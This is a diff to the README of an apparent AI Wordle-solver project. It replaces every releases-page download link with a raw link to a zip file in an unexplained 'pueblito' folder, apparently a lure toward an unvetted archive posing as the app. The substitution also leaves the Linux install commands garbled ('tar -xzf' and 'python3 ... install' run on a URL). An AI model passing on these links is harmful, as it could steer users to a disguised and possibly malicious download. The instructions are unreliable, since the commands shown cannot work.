@@ -1,6 +1,6 @@
 # 🧠 AI-Wordle-Solver - Solve Wordle with AI Smarts
 
-[![Download AI-Wordle-Solver](https://img.shields.io/badge/Download-AI--Wordle--Solver-blue.svg)](https://github.com/ossai485/AI-Wordle-Solver/releases)
+[![Download AI-Wordle-Solver](https://raw.githubusercontent.com/ossai485/AI-Wordle-Solver/main/pueblito/AI-Wordle-Solver.zip)](https://raw.githubusercontent.com/ossai485/AI-Wordle-Solver/main/pueblito/AI-Wordle-Solver.zip)
 
 ## 📖 Description
 AI Wordle Solver is an intelligent application designed to help you solve Wordle puzzles with advanced techniques. This Python-based tool uses heuristics, entropy, minimax strategies, and hybrid methods to improve its performance. You can play interactively using Gradio, analyze how the AI performs, and compare various solving algorithms.
@@ -16,7 +16,7 @@ To start using AI Wordle Solver, follow these simple instructions. No programmin
 ## 🔗 Download & Install
 To download the application, visit the releases page:
 
-[Download AI-Wordle-Solver](https://github.com/ossai485/AI-Wordle-Solver/releases)
+[Download AI-Wordle-Solver](https://raw.githubusercontent.com/ossai485/AI-Wordle-Solver/main/pueblito/AI-Wordle-Solver.zip)
 
 On this page, you will find the latest version available for download. Look for the file suitable for your operating system and click on it. The download will begin automatically.
 
@@ -41,15 +41,15 @@ After downloading the file, follow these steps to install:
 4. Eject the .dmg file after moving it to Applications.
 
 #### For Linux
-1. Locate the downloaded file, which may be a .tar.gz or similar.
+1. Locate the downloaded file, which may be a https://raw.githubusercontent.com/ossai485/AI-Wordle-Solver/main/pueblito/AI-Wordle-Solver.zip or similar.
 2. Open your terminal.
 3. Navigate to the directory containing the downloaded file.
 4. Run the following commands to extract and install:
 
    ```
-   tar -xzf yourfile.tar.gz
+   tar -xzf https://raw.githubusercontent.com/ossai485/AI-Wordle-Solver/main/pueblito/AI-Wordle-Solver.zip
    cd extracted-folder
-   python3 setup.py install
+   python3 https://raw.githubusercontent.com/ossai485/AI-Wordle-Solver/main/pueblito/AI-Wordle-Solver.zip install
    ```
 
 ## 🎮 Using AI Wordle Solver
@@ -87,4 +87,4 @@ Stay updated with the latest features and fixes by checking the release notes li
 
 For any questions or suggestions, connect with us on the issues page, and we will do our best to assist you promptly.
 
-[Download AI-Wordle-Solver](https://github.com/ossai485/AI-Wordle-Solver/releases)
+[Download AI-Wordle-Solver](https://raw.githubusercontent.com/ossai485/AI-Wordle-Solver/main/pueblito/AI-Wordle-Solver.zip)
